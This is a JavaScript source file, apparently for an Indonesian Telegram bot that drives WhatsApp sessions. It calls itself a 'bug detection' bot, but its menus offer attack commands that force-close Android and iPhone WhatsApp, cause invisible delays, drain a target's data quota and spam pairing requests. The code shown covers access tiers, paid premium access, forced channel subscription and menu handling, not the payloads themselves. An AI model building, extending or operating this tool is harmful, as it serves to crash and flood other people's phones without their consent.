module.exports = {
  startSesi,
  checkWhatsAppConnection,
  loadJSON,
  saveJSON,
  deleteSession,
};
//// Variabel ///
let antiCulik = true;
let autoReject = false; 
let pendingGroups = new Map();
let whitelistGroups = []; 
//////////////////////////////////////
let ownerUsers = loadOwner();
let premiumUsers = loadJSON(premiumFile);
let adminList    = [];

loadAdmins();

//////////////////////////////////////

/// ---- OWNER ---- ///
const checkOwner = (ctx, next) => {
  const id = ctx.from.id.toString();

  if (!ownerUsers.includes(id)) {
    return ctx.reply("❌ Anda Harus Menjadi Owner Agar Bisa Menggunakan Semua Fitur Tersedia");
  }

  return next();
};
/// ---- ADMIN ---- ///
const checkAdmin = (ctx, next) => {
  const id = ctx.from.id.toString();

  if (
    !adminList.includes(id) &&
    !ownerUsers.includes(id)
  ) {
    return ctx.reply("❌ Anda Harus Menjadi Admin");
  }

  return next();
};
const checkAllPremium = (ctx, next) => {
  const id = ctx.from.id.toString();

  
  if (premiumUsers.includes(id)) {
    return next();
  }

 
  if (ctx.chat.type !== "private" && isGroupPremium(ctx.chat.id)) {
    return next();
  }

  return ctx.reply("❌ Anda Belum Menjadi Premium Akses");
};
/// Anti culik ///
function isSafeGroup(groupId) {
  return whitelistGroups.includes(groupId.toString());
}

function loadSafe() {
  try {
    if (!fs.existsSync(safeFile)) return [];
    return JSON.parse(fs.readFileSync(safeFile, "utf8") || "[]");
  } catch {
    return [];
  }
}

function saveSafe(data) {
  fs.writeFileSync(safeFile, JSON.stringify(data, null, 2));
}

//// Group prem ////
function loadPremiumGroups() {
  try {
    if (!fs.existsSync(premiumGroupsFile)) return [];
    return JSON.parse(fs.readFileSync(premiumGroupsFile, "utf8") || "[]");
  } catch {
    return [];
  }
}
//////////
function savePremiumGroups(data) {
  fs.writeFileSync(premiumGroupsFile, JSON.stringify(data, null, 2));
}
//////////
function isGroupPremium(groupId) {
  return loadPremiumGroups().includes(groupId.toString());
}
/// ---- ADD ADMIN ---- ///
function addAdmin(userId) {
  userId = userId.toString();

  if (!adminList.includes(userId)) {
    adminList.push(userId);
    saveAdmins();
  }
}

/// ---- REMOVE ADMIN ---- ///
function removeAdmin(userId) {
  userId = userId.toString();

  adminList = adminList.filter(id => id !== userId);
  saveAdmins();
}

/// ---- SAVE ADMIN ---- ///
function saveAdmins() {
  try {
    fs.writeFileSync("./database/admins.json", JSON.stringify(adminList, null, 2));
  } catch (err) {
    console.log("❌ Gagal save admin:", err.message);
  }
}

/// ---- LOAD ADMIN ---- ///
function loadAdmins() {
  try {
    if (!fs.existsSync("./database/admins.json")) {
      adminList = [];
      return;
    }

    const data = fs.readFileSync("./database/admins.json", "utf8");

   
    adminList = JSON.parse(data || "[]").map(id => id.toString());

  } catch (err) {
    console.log("⚠️ Gagal load admin:", err.message);
    adminList = [];
  }
}
/// ---- SLEEP ---- ///
function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

/// ---- CHECK PREMIUM ---- ///
function isPremium(userId) {
  return premiumUsers.includes(userId.toString());
}

/// ---- CHECK OWNER ---- ///
function isOwner(id) {
  return ownerUsers.includes(id.toString());
}

/// ---- LOAD OWNER ---- ///
function loadOwner() {
  try {
    if (!fs.existsSync(ownerFile)) return [];
    return JSON.parse(fs.readFileSync(ownerFile, "utf8") || "[]");
  } catch {
    return [];
  }
}
/// ------ Check Sender ------- \\\
function isSender(userId) {
  return senderUsers.includes(String(userId));
}
// ================= ANTI FOTO =============== //
function loadAntiFoto() {
  try {
    if (!fs.existsSync(antiFotoFile)) return []
    return JSON.parse(fs.readFileSync(antiFotoFile))
  } catch {
    return []
  }
}


function saveAntiFoto(data) {
  fs.writeFileSync(antiFotoFile, JSON.stringify(data, null, 2))
}

let antiFotoGroups = loadAntiFoto()

/// ------- ANTI VIDIO ------- ///
function loadAntiVideo() {
  try {
    if (!fs.existsSync(antiVideoFile)) return []
    return JSON.parse(fs.readFileSync(antiVideoFile))
  } catch {
    return []
  }
}

function saveAntiVideo(data) {
  fs.writeFileSync(antiVideoFile, JSON.stringify(data, null, 2))
}

let antiVideoGroups = loadAntiVideo()
/// ---- GROUP ONLY ---- ///
bot.use((ctx, next) => {
  const groupMode = getGroupMode();

  if (groupMode === "on" && ctx.chat.type === "private") {
    return ctx.reply(`
🔒 ＧＲＯＵＰ ONLY
──────────
Bot ini hanya bisa digunakan di dalam group.
Silakan gunakan perintah di group.
`);
  }

  return next();
});
/// ---- SELF / PUBLIC MODE ---- ///
bot.use((ctx, next) => {
  const mode = getMode();

  if (mode === "self" && !isOwner(ctx.from.id)) {

    if (ctx.callbackQuery) {
      return ctx.answerCbQuery("🔒 BOT DI KUNCI OWNER", { show_alert: true });
    }

    return; 
  }

  return next();
});
/// ---- COOLDOWN ---- ///
function parseCooldown(input) {
  const match = input.match(/^(\d+)([dhms])$/);
  if (!match) return null;

  const value = parseInt(match[1]);
  const unit = match[2];

  switch (unit) {
    case "d": // detik
      return value * 1000;

    case "m": // menit
      return value * 60 * 1000;

    case "h": // jam
      return value * 60 * 60 * 1000;

    case "s": // hari
      return value * 24 * 60 * 60 * 1000;

    default:
      return null;
  }
}


let COOLDOWN_TIME = 1;
let COOLDOWN_TEXT = "1d";
const cooldowns = new Map();

function checkCooldown(ctx, next) {
  if (!ctx.from?.id) return next();


  if (isOwner(ctx.from.id)) return next();


  if (COOLDOWN_TIME === 0) return next();

  const userId = String(ctx.from.id);
  const now = Date.now();

  const expireTime = cooldowns.get(userId) || 0;

  if (now < expireTime) {
    
    if (!cooldowns.get(userId + "_msg")) {
      cooldowns.set(userId + "_msg", true);

      setTimeout(() => cooldowns.delete(userId + "_msg"), 3000);

      return ctx.reply(`⏳ Tunggu ${COOLDOWN_TEXT}!`);
    }
    return;
  }

  
  cooldowns.set(userId, now + COOLDOWN_TIME);

  return next();
}
// =========================================
// FORCE SUBSCRIBE MULTIPLE CHANNEL SYSTEM
// =========================================

const REQUIRED_CHANNELS_FILE = "./required_channels.json";
let REQUIRED_CHANNELS = [];

// Load daftar channel dari file JSON
function loadRequiredChannels() {
  try {
    if (fs.existsSync(REQUIRED_CHANNELS_FILE)) {
      const data = fs.readFileSync(REQUIRED_CHANNELS_FILE, "utf8");
      REQUIRED_CHANNELS = JSON.parse(data);
    } else {
      REQUIRED_CHANNELS = [];
    }
  } catch (e) {
    console.log("Gagal load channel:", e.message);
    REQUIRED_CHANNELS = [];
  }
}

// Simpan daftar channel ke file JSON
function saveRequiredChannels() {
  try {
    fs.writeFileSync(REQUIRED_CHANNELS_FILE, JSON.stringify(REQUIRED_CHANNELS, null, 2));
  } catch (e) {
    console.log("Gagal save channel:", e.message);
  }
}

loadRequiredChannels();

// ========= CEK CHANNEL YANG BELUM DIJOIN USER =========
async function getNotJoinedChannels(userId) {
  const notJoined = [];
  for (const channel of REQUIRED_CHANNELS) {
    try {
      const member = await bot.telegram.getChatMember(`@${channel}`, userId);
      const isJoined = ["member", "administrator", "creator"].includes(member.status);
      if (!isJoined) notJoined.push(channel);
    } catch (err) {
      console.log(`Gagal cek channel @${channel}:`, err.message);
      notJoined.push(channel); // anggap belum join jika error
    }
  }
  return notJoined;
}

// ========= CEK APAKAH SUDAH JOIN SEMUA CHANNEL =========
async function isJoinedAllChannels(userId) {
  const notJoined = await getNotJoinedChannels(userId);
  return notJoined.length === 0;
}

// ========= KIRIM PESAN WAJIB JOIN =========
async function sendForceSubscribeMessage(ctx) {
  const notJoined = await getNotJoinedChannels(ctx.from.id);
  if (notJoined.length === 0) return true;

  const channelList = notJoined.map(ch => `• <a href="https://t.me/${ch}">@${ch}</a>`).join("\n");
  const text = `
<blockquote><b>⚠️ AKSES TERBLOKIR</b></blockquote>
Kamu wajib join <b>${notJoined.length} channel</b> berikut:

${channelList}

───────────────
Setelah join semua channel, klik tombol <b>✅ Ç̧È̀K JÖÌñ</b>.
`;

  const buttons = [];
  for (const ch of notJoined) {
    buttons.push([{
      text: `📢 Jðï̈ñ @${ch}`,
      url: `https://t.me/${ch}`,
      style: "danger"
    }]);
  }
  buttons.push([{
    text: "✅ ÇÈK ☇ JÖÌñ",
    callback_data: "check_join",
    style: "primary"
  }]);

  // Anti spam 15 detik (jika session tersedia)
  if (ctx.session?.forceSubSent) return false;
  if (ctx.session) {
    ctx.session.forceSubSent = true;
    setTimeout(() => { ctx.session.forceSubSent = false; }, 15000);
  }

  await ctx.reply(text, { parse_mode: "HTML", reply_markup: { inline_keyboard: buttons } });
  return false;
}

// ========= CALLBACK VERIFIKASI =========
bot.action("check_join", async (ctx) => {
  try { await ctx.answerCbQuery("🔍 Memeriksa..."); } catch {}
  const notJoined = await getNotJoinedChannels(ctx.from.id);
  if (notJoined.length > 0) {
    const list = notJoined.map(ch => `• @${ch}`).join("\n");
    return ctx.reply(`❌ Kamu masih belum join:\n${list}\n\nSilakan join lalu klik CHECK lagi.`, { parse_mode: "HTML" });
  }
  try {
    await ctx.editMessageText("✅ Verifikasi berhasil! Sekarang kamu bisa menggunakan bot.");
  } catch {
    await ctx.reply("✅ Verifikasi berhasil! Sekarang kamu bisa menggunakan bot.");
  }
});

// ========= COMMAND SETCHANNEL (kelola channel) =========
bot.command("setchannel", checkOwner, checkAdmin, async (ctx) => {
  try {
    const args = ctx.message.text.split(" ");
    if (args.length < 2) {
      return ctx.reply(
        "🪧 ☇ Penggunaan:\n" +
        "/setchannel add @channel\n" +
        "/setchannel remove @channel\n" +
        "/setchannel list\n" +
        "/setchannel clear"
      );
    }
    const action = args[1].toLowerCase();
    if (action === "add") {
      if (args.length < 3) return ctx.reply("❌ Masukkan channel: /setchannel add @channel");
      let newChannel = args[2];
      if (!newChannel.startsWith("@")) newChannel = "@" + newChannel;
      await bot.telegram.getChat(newChannel); // validasi
      const clean = newChannel.replace("@", "");
      if (REQUIRED_CHANNELS.includes(clean)) return ctx.reply("❌ Channel sudah ada di daftar.");
      REQUIRED_CHANNELS.push(clean);
      saveRequiredChannels();
      return ctx.reply(`✅ Channel ${newChannel} berhasil ditambahkan.\nTotal: ${REQUIRED_CHANNELS.length} channel`);
    } else if (action === "remove") {
      if (args.length < 3) return ctx.reply("❌ Masukkan channel: /setchannel remove @channel");
      let channel = args[2];
      if (channel.startsWith("@")) channel = channel.substring(1);
      const index = REQUIRED_CHANNELS.indexOf(channel);
      if (index === -1) return ctx.reply("❌ Channel tidak ditemukan.");
      REQUIRED_CHANNELS.splice(index, 1);
      saveRequiredChannels();
      return ctx.reply(`✅ Channel @${channel} berhasil dihapus.\nSisa: ${REQUIRED_CHANNELS.length} channel`);
    } else if (action === "list") {
      if (REQUIRED_CHANNELS.length === 0) return ctx.reply("📭 Belum ada channel yang diset.");
      const list = REQUIRED_CHANNELS.map((ch, i) => `${i+1}. @${ch}`).join("\n");
      return ctx.reply(`📋 Daftar channel wajib join:\n${list}`);
    } else if (action === "clear") {
      REQUIRED_CHANNELS = [];
      saveRequiredChannels();
      return ctx.reply("🧹 Semua channel berhasil dihapus.");
    } else {
      return ctx.reply("❌ Perintah tidak dikenal. Gunakan: add, remove, list, clear");
    }
  } catch (err) {
    console.error("setchannel error:", err);
    return ctx.reply("❌ Channel tidak valid atau bot bukan admin channel tersebut.");
  }
});

// ========= MIDDLEWARE CEK JOIN (HANYA SAAT /start) =========
bot.use(async (ctx, next) => {
  try {
    if (!ctx.from) return next();

    const text = ctx.message?.text || "";

    // Abaikan command setchannel
    if (text.startsWith("/setchannel")) {
      return next();
    }

    const joinedAll = await isJoinedAllChannels(ctx.from.id);

    if (!joinedAll) {
      // Hanya tampilkan pesan force subscribe jika user mengirim /start
      if (text.startsWith("/start")) {
        await sendForceSubscribeMessage(ctx);
      }
      return; // Tidak lanjut ke command lain
    }

    return next();
  } catch (err) {
    console.log("Middleware error:", err.message);
    return next();
  }
});

// ================= CONFIG =================
const IMAGES = {
  home: "https://files.catbox.moe/d4nj40.png"
};

let menuAnimation = null;

const discoStyles = [
  ["Primary", "Primary", "Primary"],
  ["Danger", "Danger", "Danger"],
  ["Success", "Success", "Success"]
];

let styleIndex = 0;
let activeDiscoInterval = null; // untuk animasi keyboard

// ================= KEYBOARD UTAMA =================
function getMainKeyboard() {
  const currentStyle = discoStyles[styleIndex % discoStyles.length];
  styleIndex++;
  return {
    inline_keyboard: [
      [
        {
          text: "Ⴆυɠ ⵢ Ɱҽɳυ",
          callback_data: "xbugz",
          style: currentStyle[0] 
        },
        {
          text: "§ê††ïñg§ ⵢ Ɱҽɳυ",
          callback_data: "xsettings",
          style: currentStyle[1]
        }
      ],
      [
        {
          text: "X11 ⵢ ᎠᎬᏉ",
          url: "https://t.me/VorteyG",
          style: currentStyle[2]
        }
      ]
    ]
  };
}

// ================= TOMBOL BACK (DISCO) =================
function getBackButton2() {
  const currentStyle = discoStyles[styleIndex % discoStyles.length];
  styleIndex++;
  return {
    inline_keyboard: [
      [
        {
          text: "☇ ßå¢k ⌂ Mêñµ",
          callback_data: "home",
          style: currentStyle[0]
        },
        {
          text: "ñêx† ☇ Ꮲågê",
          callback_data: "xownerpage2",
          style: currentStyle[1]
        }
      ]
    ]
  };
}

function getBackButton() {
  const currentStyle = discoStyles[styleIndex % discoStyles.length];
  styleIndex++;
  return {
    inline_keyboard: [
      [
        {
          text: "☇ ßå¢k ⌂ Mêñµ",
          callback_data: "home",
          style: currentStyle[0]
        }
      ]
    ]
  };
}

// ================= MEMULAI EFEK DISCO PADA KEYBOARD =================
function startDiscoKeyboard(ctx, msg, keyboardGetter, intervalMs = 2500) {
  // Hentikan animasi yang sedang berjalan
  if (activeDiscoInterval) clearInterval(activeDiscoInterval);

  activeDiscoInterval = setInterval(async () => {
    try {
      const keyboard = keyboardGetter();
      await ctx.telegram.editMessageReplyMarkup(
        ctx.chat.id,
        msg.message_id,
        undefined,
        keyboard
      );
    } catch (err) {
      // Jika pesan sudah tidak bisa diedit (misal sudah dihapus), hentikan interval
      if (err.description?.includes("message can't be edited")) {
        clearInterval(activeDiscoInterval);
        activeDiscoInterval = null;
      }
    }
  }, intervalMs);
}

// ================= EDIT MENU =================
async function editMenu(ctx, caption, keyboard) {
  try {
    if (ctx.callbackQuery) {
      return await ctx.editMessageMedia(
        {
          type: "photo",
          media: IMAGES.home,
          caption,
          parse_mode: "HTML"
        },
        { reply_markup: keyboard }
      );
    } else {
      return await ctx.replyWithPhoto(IMAGES.home, {
        caption,
        parse_mode: "HTML",
        reply_markup: keyboard
      });
    }
  } catch {
    return await ctx.reply(caption, {
      parse_mode: "HTML",
      reply_markup: keyboard
    });
  }
}

// ================= SENDER STATUS =================
function getSenderStatus() {
  const isConnected = global.senderConnected || false;
  return isConnected ? "𝙰𝙲𝚃𝙸𝚅𝙴 √" : "𝙸𝙽𝙰𝙲𝚃𝙸𝚅𝙴 🅇";
}

// ================= HOME CAPTION =================
function getHomeCaption(username) {
  return `
<blockquote><b>( メ ) – Äkåðzïk Ìñvï¢†µ§</b>
⎔ Author : @VorteyG
⎔ Version : 𝟷.𝟶
⎔ Type : ᴊᴀᴠᴀsᴄʀɪᴘᴛ
⎔ Status Sender : ${getSenderStatus()}</blockquote>

<blockquote>Use it wisely and responsibly, remember karma is real and there's always someone better than you.</blockquote>
ⵢ Tap button below to continue →
`;
}

// ================= START =================
bot.start(async (ctx) => {
  const username = ctx.from.username ? `@${ctx.from.username}` : "Tidak Diketahui";
  const msg = await editMenu(ctx, getHomeCaption(username), getMainKeyboard());
  startDiscoKeyboard(ctx, msg, getMainKeyboard);
});

// ================= XBUGZ MENU =================
bot.action("xbugz", async (ctx) => {
  await ctx.answerCbQuery().catch(() => {});
  // Hentikan animasi sebelumnya (jika ada)
  if (activeDiscoInterval) clearInterval(activeDiscoInterval);

  const page = `
<blockquote><b>( メ ) – Äkåðzïk Ìñvï¢†µ§</b></blockquote>
<tg-emoji emoji-id="6210979140485517247">👋🏻</tg-emoji>こんにちは 私はTelegram経由のWhatsAppバグ検出ボットです。

⬡═―—⊱ ⎧ ⚡︎⃟Bug Men︎⃟u ⎭ ⊰―—═⬡
<blockquote>¡ ᴅᴇʟᴀʏ ⵢ ʜᴀʀᴅ ¡</blockquote>
⎧々⎭ /Cyzx ☇ Delay Invisible
<blockquote>! ʙᴜʟᴅᴏᴢʏʀ ⵢ ɪɴᴠɪs !</blockquote>
⎧々⎭ /SedotKuota ☇ suck up quota Invisible
<blockquote>! ғᴏʀᴄʟᴏᴢʏ ⵢ ᴄʀᴏᴛ ¡</blockquote>
[⌭] /Forclozy ☇ Fc Andro & Ip
<blockquote> ¡ ɪᴘʜᴏɴᴇ ⵢ ɪɴᴠɪs ¡</blockquote>
[⌭] /iosbug ☇ force close Iphone
`;

  const msg = await editMenu(ctx, page, getBackButton());
  // Mulai efek disco untuk tombol back (berubah warna setiap interval)
  startDiscoKeyboard(ctx, msg, getBackButton);
});
// ================= OWN PAGE 2 MENU =================
bot.action("xownerpage2", async (ctx) => {
  await ctx.answerCbQuery().catch(() => {});
  // Hentikan animasi disco jika ada (tapi tidak akan memulai lagi)
  if (activeDiscoInterval) clearInterval(activeDiscoInterval);

  const page = `
<blockquote><b>( メ ) – Äkåðzïk Ìñvï¢†µ§</b></blockquote>
<tg-emoji emoji-id="6210979140485517247">👋🏻</tg-emoji>こんにちは 私はTelegram経由のWhatsAppバグ検出ボットです。

<blockquote>⬡═―—⊱ ⎧ <b>ÖWñÈR þÄGÈ 2</b> ⎭ ⊰―—═⬡</blockquote>
<blockquote expandable><b>∆ [ 𝟭 ] ∆</b>
◉ /setcd - Set Cooldown d/m/h
◉ /ssiphone - Screenshot Iphone
◉ /time - Waktu WIB/WIT/WITA
◉ /brat - Restart Otomatis Panel</blockquote>
<blockquote expandable><b>∆ [ 𝟮 ] ∆</b>
◉ /cekidch - Set Cooldown d/m/h
◉ /tiktokdl - Screenshot Iphone
◉ /hdphoto - Hd Photo
◉ /lagu - Play Lagu</blockquote>
<blockquote expandable><b>∆ [ 𝟯 ] ∆</b>
◉ /SpamPairing - Spam Pairing
◉ /encjs - Encrypt Code
◉ /decjs - Decode 
◉ /catboxurl - Photo To Url</blockquote>
`;

  // Kirim menu dengan tombol back (tanpa memulai animasi disco)
  const msg = await editMenu(ctx, page, getBackButton());
  // Tidak perlu startDiscoKeyboard - tombol statis
});

// ================= XSETTINGS =================
bot.action("xsettings", async (ctx) => {
  await ctx.answerCbQuery().catch(() => {});
  if (activeDiscoInterval) clearInterval(activeDiscoInterval);

  const page = `
<blockquote><b>ÄKÄÖZÌK ÌñVÌÇ₮Ú§</b></blockquote>
<tg-emoji emoji-id="6210979140485517247">👋🏻</tg-emoji>こんにちは 私はTelegram経由のWhatsAppバグ検出ボットです。

<blockquote><b>ᎯᏬᎿᎾ ᏬᏢᎠᎯᎿᎬ ᏕᏨᏒᎨᏢᎿ</b></blockquote>
⟳ /pullupdate - Auto-Update Script  

<blockquote><b>ÖWñÈR §È₮₮ÌñG§</b></blockquote>
<blockquote expandable>◉ /connect - Connect Sender  
◉ /listbot - List Actived Sender
◉ /killsesi - Kill Session All 
◉ /delpair - Kill Session Target  
◉ /restart - Restart Otomatis Panel</blockquote>  
<blockquote><b>ÇÖMMÄñÐ §È₮₮ÌñG§</b></blockquote>
<blockquote>⌨ /unblock - Actived Command
⌨ /block - Nonaktif Command
⌨ /listblock - List Nonaktif Command</blockquote>
<blockquote><b>ÄÐÐÈÐ §È₮₮ÌñG§</b></blockquote>
<blockquote expandable>✧ /addowner - Add Owner Access  
✧ /delowner - Del Owner Access  
✧ /addadmin - Add Admin Access  
✧ /deladmin - Del Admin Access  
✧ /addprem - Add Premium Access  
✧ /delprem - Del Premium Access 
✧ /listakses - Show Akses</blockquote>
<blockquote><b>GRÖÚᏢ §È₮₮ÌñG§</b></blockquote>
<blockquote expandable>⦿ /addgrup - Add Group Premium  
⦿ /delgrup - Del Group Premium  
⦿ /listgrup - List Group premium
⦿ /groupon - Mode Group Only
⦿ /groupoff - Mode Group Only Off
⦿ /anticulik - Anti Culik Bot  
⦿ /addsafe - Add Safe  
⦿ /delsafe - Off safe  
⦿ /antifoto - Block Foto Send To Group  
⦿ /antivideo - Block Video Send To Group</blockquote>
`;

  const msg = await editMenu(ctx, page, getBackButton2());
  // Tidak perlu startDiscoKeyboard - tombol statis
});

// ================= HOME =================
bot.action("home", async (ctx) => {
  await ctx.answerCbQuery().catch(() => {});
  // Hentikan animasi sebelumnya
  if (activeDiscoInterval) clearInterval(activeDiscoInterval);

  const username = ctx.from.username ? `@${ctx.from.username}` : "Tidak Diketahui";
  const msg = await editMenu(ctx, getHomeCaption(username), getMainKeyboard());
  startDiscoKeyboard(ctx, msg, getMainKeyboard);
});

bot.command("addgrup", checkOwner, async (ctx) => {
  try {

    // ================= PRIVATE CHECK =================
    if (ctx.chat.type === "private") {
      return ctx.reply("❌ Command ini hanya bisa digunakan di group");
    }

    // ================= GET GROUP DATA =================
    const groupId = ctx.chat.id.toString();
    const groupName = ctx.chat.title || "Unknown";

    // ================= LOAD DATA =================
    let premiumGroups = loadPremiumGroups();

    // ================= CHECK DUPLICATE =================
    if (premiumGroups.includes(groupId)) {
      return ctx.reply(
`<blockquote><b>⚠️ GROUP SUDAH PREMIUM</b>
<b>Id Group :</b> ${groupId}
<b>Name Group :</b> ${groupName}
<b>Status :</b> Already Registered</blockquote>`,
      { parse_mode: "HTML" }
      );
    }

    // ================= ADD GROUP =================
    premiumGroups.push(groupId);
    savePremiumGroups(premiumGroups);

    // ================= SUCCESS RESPONSE =================
    return ctx.reply(
`<blockquote><b>━━━━━━━━━━━━━━</b>
<b>SUCCSSFULLY ✅ ADDED GROUP</b>
<b>━━━━━━━━━━━━━━</b></blockquote>
<blockquote>☇ <b>Id Group :</b> ${groupId}
☇ <b>Name Group :</b> ${groupName}
☇ <b>Status :</b> Succesfully</blockquote>`,
      { parse_mode: "HTML" }
    );

  } catch (err) {
    console.error(err);
    ctx.reply("❌ Terjadi error");
  }
});

bot.command("delgrup", checkOwner, async (ctx) => {
  try {
    
    if (ctx.chat.type === "private") {
      return ctx.reply("❌ Command ini hanya bisa digunakan di group");
    }

    const groupId = ctx.chat.id.toString();
    let premiumGroups = loadPremiumGroups();

    
    if (!premiumGroups.includes(groupId)) {
      return ctx.reply("⚠️ Group ini bukan premium");
    }

    
    premiumGroups = premiumGroups.filter(id => id !== groupId);

    savePremiumGroups(premiumGroups);

    return ctx.reply("✅ Group berhasil dihapus dari PREMIUM");
  } catch (err) {
    console.error(err);
    ctx.reply("❌ Terjadi error");
  }
});

bot.command("listgrup", checkOwner, async (ctx) => {

  try {

    // ================= LOAD DATA =================
    const premiumGroups = loadPremiumGroups();

    // ================= EMPTY CHECK =================
    if (!premiumGroups || premiumGroups.length < 1) {

      return ctx.reply(

`<blockquote><b>━━━━━━━━━━━━━━</b>
<b>GROUP PREMIUM ❌ NOT FOUND</b>
<b>━━━━━━━━━━━━━━</b></blockquote>
Tidak ada group premium yang terdaftar.`,

        {
          parse_mode: "HTML"
        }

      );

    }

    // ================= HEADER =================
    let text = `
<blockquote><b>━━━━━━━━━━━━━━━━━━━━━━</b>
<b>LIST GROUP PREMIUM</b>
<b>━━━━━━━━━━━━━━━━━━━━━━</b></blockquote>

`;

    // ================= LOOP GROUP =================
    for (let i = 0; i < premiumGroups.length; i++) {

      const groupId = premiumGroups[i];

      try {

        const groupData =
          await ctx.telegram.getChat(groupId);

        const groupName =
          groupData.title || "Unknown";

        text += `
<blockquote><b>${i + 1}. ${groupName}</b></blockquote>
<blockquote><b>Id Group :</b> <code>${groupId}</code>
<b>Status :</b> Premium Active √</blockquote>
`;

      } catch {

        text += `
<blockquote><b>${i + 1}. Unknown Group</b></blockquote>
<blockquote><b>Id Group :</b> <code>${groupId}</code>
<b>Status :</b> Bot Left / Invalid</blockquote>
`;

      }

    }

    // ================= FOOTER =================
    text += `
<blockquote><b>Total Group Premium :</b> ${premiumGroups.length}</blockquote>
`;

    // ================= SEND =================
    return ctx.reply(text, {
      parse_mode: "HTML"
    });

  } catch (err) {

    console.error(err);

    return ctx.reply(
      "❌ Terjadi error saat mengambil list group"
    );

  }

});

bot.command("cekowner", (ctx) => {
  const data = loadJSON(ownerFile);
  ctx.reply(`ID kamu: ${ctx.from.id}\nOwner list: ${data.join(", ")}`);
});

// ========== COMMAND /addowner (BUTTON CONFIRM) ==========
bot.command("addowner", checkOwner, async (ctx) => {
  let targetUserId;

  if (ctx.message.reply_to_message) {
    targetUserId = ctx.message.reply_to_message.from.id.toString();
  } else {
    const args = ctx.message.text.split(" ");
    targetUserId = args[1];
  }

  if (!targetUserId) {
    return ctx.reply(
`
\`\`\`js
Ä̈KÄ̈Ö̈ZÌ̀K ÌñVÌÇ†Ú§  - 𝙀𝙓𝘼𝙈𝙋𝙇𝙀 ☊
━━━━━━━━━━━━━━━━
☇ 𝚁𝚎𝚙𝚕𝚢 𝚙𝚎𝚜𝚊𝚗 𝚞𝚜𝚎𝚛 𝚍𝚎𝚗𝚐𝚊𝚗 /addowner 
☇ 𝙰𝚝𝚊𝚞 𝚔𝚎𝚝𝚒𝚔 /addowner 6463589761 / 𝙸𝚍 𝚞𝚜𝚎𝚛
\`\`\`
`
    );
  }

  if (ownerUsers.includes(targetUserId)) {
    return ctx.reply(
`
\`\`\`js
𝗦𝗧𝗔𝗧𝗨𝗦 - 𝙎𝙔𝙎𝙏𝙀𝙈 ߷
━━━━━━━━━━━━
⸙ 𝚂𝚞𝚍𝚊𝚑 𝚖𝚎𝚗𝚓𝚊𝚍𝚒 𝙾𝚠𝚗𝚎𝚛 √
⸙ 👤 𝙸𝚍 𝚄𝚜𝚎𝚛: \`${targetUserId}\`
\`\`\`
`,
      { parse_mode: "Markdown" }
    );
  }

  // Kirim konfirmasi tombol
  await ctx.reply(
`
\`\`\`js
𝙎𝙔𝙎𝙏𝙀𝙈 - 𝘾𝙊𝙉𝙁𝙄𝙍𝙈𝘼𝙏𝙄𝙊𝙉 ♻️
━━━━━━━━━━━━━━━━━━
⸙ 𝙲𝚕𝚒𝚌𝚔 𝚝𝚘𝚖𝚋𝚘𝚕 𝚍𝚒 𝚋𝚊𝚠𝚊𝚑 𝚞𝚗𝚝𝚞𝚔 𝚊𝚍𝚍 / 𝚈𝚎𝚜 𝚘𝚛 𝙽𝚘
⸙ 👤 𝙸𝚍 𝚄𝚜𝚎𝚛: \`${targetUserId}\`
\`\`\`
`,
    {
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [
            { text: "✅ YES", callback_data: `confirm_addowner_${targetUserId}`, style: "success" },
            { text: "❌ NO", callback_data: `cancel_addowner`, style: "primary" }
          ]
        ]
      }
    }
  );
});


// ========== BUTTON YES ==========
bot.action(/confirm_addowner_(.+)/, async (ctx) => {
  const targetUserId = ctx.match[1];

  if (ownerUsers.includes(targetUserId)) {
    return ctx.answerCbQuery("Sudah jadi owner ❗");
  }

  ownerUsers.push(targetUserId);
  saveJSON(ownerFile, ownerUsers);

  await ctx.editMessageText(
`
\`\`\`js
ÄKÄÖZÌK ÌMVÌÇ†Ú§ - 𝙎𝙐𝘾𝘾𝙀𝙎𝙁𝙐𝙇𝙔 ᣲ
━━━━━━━━━━━━━━━━━━━━━━━━
⸙ 𝙾𝚠𝚗𝚎𝚛 𝚜𝚞𝚌𝚌𝚎𝚜𝚜 𝚍𝚒𝚛𝚊𝚖𝚋𝚊𝚑𝚔𝚊𝚗
⸙ 👤 𝙸𝚍 𝚄𝚜𝚎𝚛: \`${targetUserId}\`
⸙ 𝙰𝚌𝚌𝚎𝚜 𝚕𝚎𝚋𝚒𝚑 𝚊𝚔𝚊𝚗 𝚍𝚒 𝚋𝚎𝚛𝚒𝚔𝚊𝚗 ⎙
\`\`\`
`,
    { parse_mode: "Markdown" }
  );

  ctx.answerCbQuery("ᴀʟʟ ᴄᴏɴғɪʀᴍᴀᴛɪᴏɴ sᴜᴄᴄᴇssғᴜʟʏ √•√");
});


// ========== BUTTON NO ==========
bot.action("cancel_addowner", async (ctx) => {
  await ctx.editMessageText(
`
\`\`\`js
ÄKÄÖZÌK ÌñVÌÇ₮Ú§ - 𝙀𝙍𝙍𝙊𝙍
━━━━━━━━━━━
⸙ ᴀᴅᴅᴇᴅ ᴏᴡɴᴇʀ ᴅɪ ʙᴀᴛᴀʟᴋᴀɴ ⎋
⸙ ᴄᴀɴᴄᴇʟ sᴜᴄᴄᴇssғᴜʟʏ √...
\`\`\`
`,
  { parse_mode: "Markdown" }
  );

  ctx.answerCbQuery("ᴄᴀɴᴄᴄᴇʟᴇᴅ ᴀʟʟ ᴄᴏɴғɪʀᴍᴀᴛɪᴏɴ √");
});
// ========== COMMAND /delowner (ITALIC STYLE) ==========
bot.command("delowner", checkOwner, async (ctx) => {
  let targetUserId;

  if (ctx.message.reply_to_message) {
    targetUserId = ctx.message.reply_to_message.from.id.toString();
  } else {
    const args = ctx.message.text.split(" ");
    targetUserId = args[1];
  }

  if (!targetUserId) {
    return ctx.reply(
`
\`\`\`js
ÄKÄÖZÌK ÌñVÌÇ₮Ú§  - 𝙀𝙓𝘼𝙈𝙋𝙇𝙀 ☊
━━━━━━━━━━━━━━━━
⸙ 𝚁𝚎𝚙𝚕𝚢 𝚙𝚎𝚜𝚊𝚗 𝚞𝚜𝚎𝚛 𝚍𝚎𝚗𝚐𝚊𝚗 /delowner
⸙ 𝚊𝚝𝚊𝚞 𝚔𝚎𝚝𝚒𝚔 /delowner 8657792129 / 𝙸𝚍 𝚄𝚜𝚎𝚛
\`\`\`
`,
      { parse_mode: "Markdown" }
    );
  }

  if (!ownerUsers.includes(targetUserId)) {
    return ctx.reply(
`
\`\`\`js
𝗦𝗧𝗔𝗧𝗬𝗦 - 𝙎𝙔𝙎𝙏𝙀𝙈 ߷
━━━━━━━━━━━━
